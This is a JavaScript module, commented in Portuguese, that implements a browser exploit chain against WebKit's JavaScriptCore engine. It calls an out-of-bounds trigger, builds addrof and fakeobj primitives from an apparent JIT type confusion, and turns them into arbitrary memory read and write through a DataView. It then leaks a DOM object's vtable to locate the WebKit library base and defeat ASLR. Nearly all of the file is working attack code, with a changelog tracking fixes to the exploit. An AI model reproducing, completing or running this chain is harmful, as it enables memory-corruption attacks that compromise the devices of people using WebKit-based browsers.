// js/script3/testArrayBufferVictimCrash.mjs (v120 - Correção de Pré-requisito do JIT)
// =======================================================================================
// LOG DE ALTERAÇÕES:
// - CORRIGIDO: Resolvido o TypeError que ocorria porque `addrof` retornava `undefined`.
// - MOTIVO: Uma análise do código funcional (v100) revelou que a vulnerabilidade de JIT
//   só é ativada APÓS o estado da memória ser corrompido pela primitiva OOB.
// - ADICIONADO: A chamada para `triggerOOB_primitive` foi reintroduzida como a primeira
//   etapa do exploit, sendo um pré-requisito para que a JIT Type Confusion funcione.
// =======================================================================================

import { logS3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import { JSC_OFFSETS } from '../config.mjs';
import { triggerOOB_primitive } from '../core_exploit.mjs'; // Importação necessária

export const FNAME_MODULE_FINAL = "Uncaged_v120_JIT_PrereqFix";

// --- Funções de Conversão (Double <-> Int64) ---
function int64ToDouble(int64) { /* ...código sem alterações... */ }
function doubleToInt64(double) { /* ...código sem alterações... */ }

// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL
// =======================================================================================
export async function runFinalUnifiedTest() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_FINAL;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Corrigindo Pré-requisito da JIT Confusion ---`, "test");

    let final_result = { success: false, message: "A cadeia de exploração falhou." };

    try {
        // --- FASE 1: Ativar Pré-requisito e Configurar Primitivas ---
        logS3("--- FASE 1: Ativando pré-requisito OOB e configurando primitivas... ---", "subtest");
        
        // #REASONING: A chamada OOB é necessária para desestabilizar o motor e ativar
        // a vulnerabilidade de JIT Type Confusion. Este era o passo que faltava.
        await triggerOOB_primitive({ force_reinit: true });

        const confused_array = [13.37];
        const victim_array = [{ a: 1 }];
        const addrof = (obj) => {
            victim_array[0] = obj;
            return doubleToInt64(confused_array[0]);
        };
        const fakeobj = (addr) => {
            confused_array[0] = int64ToDouble(addr);
            return victim_array[0];
        };
        logS3("Primitivas 'addrof' e 'fakeobj' operacionais.", "good");

        // --- FASE 2: Construção de Primitivas de L/E ROBUSTAS ---
        logS3("--- FASE 2: Construindo L/E arbitrária ROBUSTA via DataView... ---", "subtest");
        const dv_buf = new ArrayBuffer(8);
        const dataview_tool = new DataView(dv_buf);
        const dataview_addr = addrof(dataview_tool);
        
        // Verifica se o addrof funcionou antes de prosseguir
        if (!dataview_addr || typeof dataview_addr.add !== 'function') {
            throw new Error("A primitiva 'addrof' falhou em retornar um objeto AdvancedInt64 válido após o gatilho OOB.");
        }

        const dv_vector_ptr_addr = dataview_addr.add(JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET);
        logS3(`[SETUP] Endereço do ponteiro de dados do DataView (m_vector): ${toHex(dv_vector_ptr_addr)}`, "info");

        const leaker_obj = { obj_prop: null, val_prop: 0 };
        const unstable_arb_write = (addr, value) => {
            leaker_obj.obj_prop = fakeobj(addr);
            leaker_obj.val_prop = int64ToDouble(value);
        };

        const arb_write = (addr, value) => {
            unstable_arb_write(dv_vector_ptr_addr, addr);
            dataview_tool.setFloat64(0, int64ToDouble(value), true);
        };
        const arb_read = (addr) => {
            unstable_arb_write(dv_vector_ptr_addr, addr);
            return doubleToInt64(dataview_tool.getFloat64(0, true));
        };
        logS3("Primitivas de L/E robustas construídas.", "good");

        // --- FASE 3: Verificação Funcional ---
        logS3("--- FASE 3: Verificando a funcionalidade das novas primitivas de L/E... ---", "subtest");
        const test_obj = { prop_a: 0xDEADBEEF, prop_b: 0xCAFEBABE };
        const test_obj_addr = addrof(test_obj);
        const prop_a_addr = test_obj_addr.add(0x10);
        const value_to_write = new AdvancedInt64(0x88776655, 0x44332211);
        
        logS3(`[VERIFICAÇÃO] Escrevendo ${toHex(value_to_write)} em ${toHex(prop_a_addr)}...`, "info");
        arb_write(prop_a_addr, value_to_write);
        
        const value_read = arb_read(prop_a_addr);
        logS3(`[VERIFICAÇÃO] Valor lido de volta: ${toHex(value_read)}`, "leak");
        if (!value_read.equals(value_to_write)) {
            throw new Error(`A verificação de L/E falhou. Escrito: ${toHex(value_to_write)}, Lido: ${toHex(value_read)}`);
        }
        logS3("[VERIFICAÇÃO] SUCESSO! A verificação de L/E robusta foi bem-sucedida!", "good");

        // --- FASE 4: Vazamento da Base do WebKit ---
        logS3("--- FASE 4: Tentando vazar a base da biblioteca WebKit... ---", "subtest");
        const div_element = document.createElement('div');
        const div_addr = addrof(div_element);
        logS3(`[LEAK] Endereço do objeto DOM 'div': ${toHex(div_addr)}`, "leak");

        const vtable_ptr = arb_read(div_addr);
        logS3(`[LEAK] Ponteiro da Vtable lido do objeto: ${toHex(vtable_ptr)}`, "leak");
        if (vtable_ptr.low() === 0 && vtable_ptr.high() === 0) {
            throw new Error("Ponteiro da vtable lido é nulo.");
        }

        const ALIGNMENT_MASK = new AdvancedInt64(0x3FFF, 0).not();
        const webkit_base = vtable_ptr.and(ALIGNMENT_MASK);
        logS3(`[LEAK] Endereço base do WebKit (candidato): ${toHex(webkit_base)}`, "leak");

        const elf_magic = arb_read(webkit_base).low();
        logS3(`[LEAK] Assinatura ELF lida: ${toHex(elf_magic)}`, "leak");

        if (elf_magic === 0x464C457F) {
            logS3("++++++++++++ SUCESSO FINAL! A assinatura ELF foi encontrada! ++++++++++++", "vuln");
            final_result = {
                success: true,
                message: `Bypass de ASLR bem-sucedido. Base do WebKit: ${toHex(webkit_base)}`
            };
        } else {
            throw new Error(`Assinatura ELF não encontrada. Lido: ${toHex(elf_magic)}`);
        }

    } catch (e) {
        final_result.message = `Exceção crítica na implementação: ${e.message}`;
        logS3(`${final_result.message}\n${e.stack || ''}`, "critical");
        console.error(e);
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
    return final_result;
}
